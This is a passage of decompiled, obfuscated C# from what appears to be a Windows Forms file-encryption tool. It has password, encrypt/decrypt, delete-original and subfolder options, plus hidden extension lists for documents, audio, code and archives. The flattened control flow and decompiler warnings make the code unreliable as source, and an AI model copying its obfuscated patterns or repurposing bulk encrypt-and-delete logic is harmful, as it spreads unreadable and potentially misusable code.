					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1456),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1468),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1232),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1236),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1256),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1956)
				};
				num2 = 6;
				continue;
			case 5:
			case 8:
				goto IL_1a1f;
			case 3:
				code_ext = new string[9]
				{
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1508),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1984),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1556),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(972),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1988),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1504),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1328),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1296),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1336)
				};
				num3 = 9;
				goto IL_1b63;
			case 6:
				audio_ext = new string[6]
				{
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1960),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1460),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1964),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(468),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1968),
					_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1464)
				};
				goto default;
			default:
				_ = 0;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					num3 = 8;
					goto IL_1b63;
				}
				num2 = 0;
				continue;
			case 9:
				return;
				IL_1b63:
				num = num3;
				goto IL_1b67;
			}
			break;
		}
		goto IL_0016;
		IL_1a1f:
		compressed_ext = new string[5]
		{
			_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1220),
			_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1196),
			_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1240),
			_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1976),
			_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1980)
		};
		num2 = 3;
		goto IL_1b6b;
		IL_0016:
		document_ext = new string[9]
		{
			_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1168),
			_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1972),
			_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1200),
			_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1144),
			_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1148),
			_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1180),
			_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(964),
			_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1208),
			_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1212)
		};
		goto IL_1a1f;
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
public class _0086_008E_0093_0093_0088_0095_0089_0089_0094_0090_008D_008E_0092_0091_008D_0091_008C_008F_008C_0094_008E_008B_0086_008A_0093_0087_008C_008E_0087_0088_008C_008D_0088_0089_0087_008A : Form
{
	private IContainer components;

	private GroupBox gbPaths;

	private Button btnAddFolder;

	private Button btnAddFile;

	private ListBox lstPaths;

	private Button btnRemovePath;

	private GroupBox gbOptions;

	private CheckBox chkSubFolders;

	private CheckBox chkDeleteOrg;

	private GroupBox gbPassword;

	private TextBox txtPassword;

	private Button btnEncrypt;

	private Button btnDecrypt;

	private Label lblInfo;

	private ComboBox lstExts;

	private Label label1;

	private GroupBox gbLog;

	private TextBox txtLog;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public _0086_008E_0093_0093_0088_0095_0089_0089_0094_0090_008D_008E_0092_0091_008D_0091_008C_008F_008C_0094_008E_008B_0086_008A_0093_0087_008C_008E_0087_0088_008C_008D_0088_0089_0087_008A()
	{
		//Discarded unreachable code: IL_0005, IL_0076
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 5;
		while (true)
		{
			switch (num)
			{
			case 5:
				components = null;
				_ = 0;
				num = ((!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()) ? 3 : 0);
				break;
			case 4:
				((Form)(object)this).SetLogViewer(txtLog);
				num = 6;
				if (true)
				{
					break;
				}
				goto case 0;
			case 0:
			case 1:
				((Form)this)._002Ector();
				goto case 2;
			case 2:
			case 3:
				InitializeComponent();
				goto case 4;
			default:
				num = 4;
				break;
			case 6:
				return;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public _0086_008E_0093_0093_0088_0095_0089_0089_0094_0090_008D_008E_0092_0091_008D_0091_008C_008F_008C_0094_008E_008B_0086_008A_0093_0087_008C_008E_0087_0088_008C_008D_0088_0089_0087_008A(string[] _0020)
	{
		//Discarded unreachable code: IL_0005, IL_00f0
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 12;
		if (1 == 0)
		{
			return;
		}
		string[] array = default(string[]);
		string text = default(string);
		int num3 = default(int);
		while (true)
		{
			int num2;
			switch (num)
			{
			case 9:
				return;
			case 11:
				array = _0020;
				num = 13;
				if (true)
				{
					continue;
				}
				goto case 2;
			case 2:
			case 5:
				((Form)this)._002Ector();
				goto case 3;
			case 10:
				lstPaths.get_Items().Add((object)text);
				num = 14;
				continue;
			case 0:
			case 1:
				if (num3 < array.Length)
				{
					text = array[num3];
					num2 = 6;
					break;
				}
				num = 15;
				if (true)
				{
					continue;
				}
				goto case 3;
			case 3:
			case 8:
				InitializeComponent();
				num2 = 4;
				break;
			case 7:
				if (Directory.Exists(text))
				{
					goto IL_00df;
				}
				goto case 14;
			case 13:
				num3 = 0;
				goto case 0;
			default:
				num2 = 1;
				break;
			case 14:
				num3++;
				num = 0;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					continue;
				}
				goto case 3;
			case 6:
				if (File.Exists(text))
				{
					goto IL_00df;
				}
				num = 7;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					continue;
				}
				goto case 12;
			case 12:
				if (!_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(88))
				{
					components = null;
					_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						num = 5;
						if (0 == 0)
						{
							continue;
						}
						goto case 11;
					}
					num = 8;
					continue;
				}
				num = 9;
				if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					continue;
				}
				goto case 13;
			case 4:
				((Form)(object)this).SetLogViewer(txtLog);
				num2 = 11;
				break;
			case 15:
				return;
				IL_00df:
				num2 = 10;
				break;
			}
			num = num2;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void MainWindow_Load(object _0020, EventArgs _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		((ListControl)lstExts).set_SelectedIndex(6);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void btnAddFile_Click(object _0020, EventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0032, IL_020b
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_014a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Invalid comparison between Unknown and I4
		//IL_0332: Incompatible stack heights: 0 vs 1
		_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
		int num;
		if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
		{
			num = 3;
			goto IL_003f;
		}
		int num2 = 2;
		goto IL_003b;
		IL_003b:
		num = num2;
		goto IL_003f;
		IL_003f:
		OpenFileDialog val = default(OpenFileDialog);
		switch (num)
		{
		case 1:
			return;
		case 2:
			return;
		case 0:
		case 3:
			if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(92))
			{
				return;
			}
			val = new OpenFileDialog();
			goto case 4;
		case 4:
			try
			{
				((FileDialog)val).set_Title(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1992));
				int num3 = 8;
				int num6 = default(int);
				string[] fileNames = default(string[]);
				bool flag = default(bool);
				ObjectCollection items = default(ObjectCollection);
				bool flag2 = default(bool);
				string[] array = default(string[]);
				string text = default(string);
				while (true)
				{
					int num4 = num3;
					while (true)
					{
						int num5;
						switch (num4)
						{
						case 0:
						case 6:
							num6++;
							num5 = 21;
							goto IL_0210;
						case 19:
							((FileDialog)val).set_InitialDirectory(Application.get_StartupPath());
							num3 = 11;
							if (true)
							{
								break;
							}
							goto case 20;
						case 20:
							if (fileNames != null)
							{
								goto case 9;
							}
							return;
						case 4:
							if (!flag)
							{
								goto IL_0106;
							}
							num5 = 5;
							goto IL_0210;
						case 15:
							items = lstPaths.get_Items();
							num3 = 13;
							if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
							{
								break;
							}
							goto case 11;
						case 11:
							flag2 = (int)((CommonDialog)val).ShowDialog() == 1;
							num3 = 3;
							if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
							{
								break;
							}
							goto case 4;
						case 16:
							((FileDialog)val).set_SupportMultiDottedExtensions(true);
							num3 = 19;
							if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
							{
								break;
							}
							goto case 11;
						case 14:
							val.set_Multiselect(true);
							num3 = 16;
							if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
							{
								break;
							}
							goto case 20;
						case 3:
							if (flag2)
							{
								num3 = 7;
								break;
							}
							return;
						case 18:
						case 21:
							if (num6 >= array.Length)
							{
								num3 = 22;
								break;
							}
							text = array[num6];
							num3 = 15;
							if (0 == 0)
							{
								break;
							}
							goto case 5;
						case 13:
							flag = !items.Contains((object)text);
							num3 = 4;
							break;
						case 9:
						case 17:
							if (fileNames.Length != 0)
							{
								goto case 10;
							}
							return;
						default:
							num3 = 10;
							if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
							{
								break;
							}
							goto case 18;
						case 5:
							lstPaths.get_Items().Add((object)text);
							num5 = 6;
							goto IL_0210;
						case 10:
							do
							{
								array = fileNames;
								num3 = 12;
							}
							while (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091());
							break;
						case 1:
						case 2:
							((FileDialog)val).set_CheckPathExists(true);
							num3 = 14;
							break;
						case 12:
							num6 = 0;
							num5 = 18;
							goto IL_0210;
						case 7:
							fileNames = ((FileDialog)val).get_FileNames();
							num3 = 20;
							if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
							{
								break;
							}
							goto case 10;
						case 8:
							((FileDialog)val).set_CheckFileExists(true);
							_ = 1;
							if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
							{
								num3 = 17;
								if (true)
								{
									break;
								}
								goto case 4;
							}
							num5 = 2;
							goto IL_0210;
						case 22:
							return;
							IL_0210:
							num3 = num5;
							break;
						}
						break;
						IL_0106:
						((Form)(object)this).Log(text + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1996));
						num4 = 0;
					}
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		num2 = 4;
		goto IL_003b;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void btnRemovePath_Click(object _0020, EventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0085
		//IL_0006: Incompatible stack heights: 0 vs 1
		_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
		int num = (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091() ? 4 : 6);
		int selectedIndex = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num2;
			switch (num)
			{
			case 2:
				lstPaths.get_Items().RemoveAt(selectedIndex);
				num = 5;
				break;
			case 1:
			case 4:
				flag = selectedIndex != -1;
				num2 = 3;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 2;
				}
				goto IL_008e;
			case 0:
			case 6:
				selectedIndex = ((ListControl)lstPaths).get_SelectedIndex();
				goto case 1;
			case 3:
				if (flag)
				{
					goto case 2;
				}
				return;
			default:
				num2 = 2;
				goto IL_008e;
			case 5:
				((ListControl)lstPaths).set_SelectedIndex((selectedIndex < lstPaths.get_Items().get_Count()) ? selectedIndex : (selectedIndex - 1));
				((Control)lstPaths).Focus();
				num2 = 7;
				goto IL_008e;
			case 7:
				return;
				IL_008e:
				num = num2;
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void btnAddFolder_Click(object _0020, EventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0055, IL_01e8
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		//IL_01c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Invalid comparison between Unknown and I4
		_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
		int num;
		if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
		{
			num = 2;
		}
		else
		{
			num = 3;
			if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
			{
				goto IL_0049;
			}
		}
		int num2 = num;
		while (true)
		{
			switch (num2)
			{
			case 0:
			case 2:
				if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(96))
				{
					break;
				}
				return;
			case 1:
			case 3:
				break;
			default:
				num2 = 4;
				continue;
			case 4:
				goto IL_0085;
			}
			break;
		}
		goto IL_0049;
		IL_0049:
		FolderBrowserDialog val = new FolderBrowserDialog();
		goto IL_0085;
		IL_0085:
		try
		{
			val.set_Description(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2000));
			int num3 = 13;
			if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
			{
				goto IL_0176;
			}
			goto IL_01f1;
			IL_0176:
			val.set_RootFolder(Environment.SpecialFolder.MyComputer);
			_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
			int num4;
			if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
			{
				num4 = 8;
				goto IL_01ed;
			}
			num3 = 0;
			if (1 == 0)
			{
				goto IL_01c0;
			}
			goto IL_01f1;
			IL_01ed:
			num3 = num4;
			goto IL_01f1;
			IL_01c0:
			bool flag = (int)((CommonDialog)val).ShowDialog() == 1;
			num3 = 4;
			goto IL_01f1;
			IL_01f1:
			bool flag3 = default(bool);
			ObjectCollection items = default(ObjectCollection);
			string selectedPath = default(string);
			bool flag2 = default(bool);
			while (true)
			{
				IL_01f1_2:
				int num5 = num3;
				while (true)
				{
					switch (num5)
					{
					case 4:
						break;
					case 7:
						goto IL_00be;
					case 3:
						goto IL_00e4;
					case 13:
						val.set_ShowNewFolderButton(true);
						num3 = 9;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto IL_01f1_2;
						}
						goto case 10;
					case 10:
						flag3 = !items.Contains((object)selectedPath);
						num5 = 3;
						continue;
					case 0:
						return;
					case 11:
						return;
					case 1:
						goto IL_0150;
					case 6:
						if (flag2)
						{
							num3 = 7;
							goto IL_01f1_2;
						}
						return;
					case 9:
						goto IL_0176;
					case 12:
						lstPaths.get_Items().Add((object)selectedPath);
						return;
					case 2:
					case 8:
						goto IL_01c0;
					case 5:
						flag2 = !string.IsNullOrEmpty(selectedPath);
						goto case 6;
					default:
						num3 = 6;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto IL_01f1_2;
						}
						goto case 6;
					case 14:
						return;
					}
					break;
					IL_00e4:
					if (flag3)
					{
						num3 = 12;
						goto IL_01f1_2;
					}
					((Form)(object)this).Log(selectedPath + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(1996));
					num5 = 14;
					continue;
					IL_00be:
					do
					{
						items = lstPaths.get_Items();
						num3 = 10;
					}
					while (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092());
					goto IL_01f1_2;
				}
				break;
			}
			if (flag)
			{
				num4 = 1;
				goto IL_01ed;
			}
			return;
			IL_0150:
			selectedPath = val.get_SelectedPath();
			num4 = 5;
			goto IL_01ed;
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[AsyncStateMachine(typeof(_003CbtnEncrypt_Click_003Ed__6))]
	[DebuggerStepThrough]
	private void btnEncrypt_Click(object _0020, EventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0021
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_00d3: Incompatible stack heights: 0 vs 1
		int num = 5;
		_003CbtnEncrypt_Click_003Ed__6 stateMachine = default(_003CbtnEncrypt_Click_003Ed__6);
		AsyncVoidMethodBuilder _003C_003Et__builder = default(AsyncVoidMethodBuilder);
		while (true)
		{
			int num2;
			int num3;
			switch (num)
			{
			case 0:
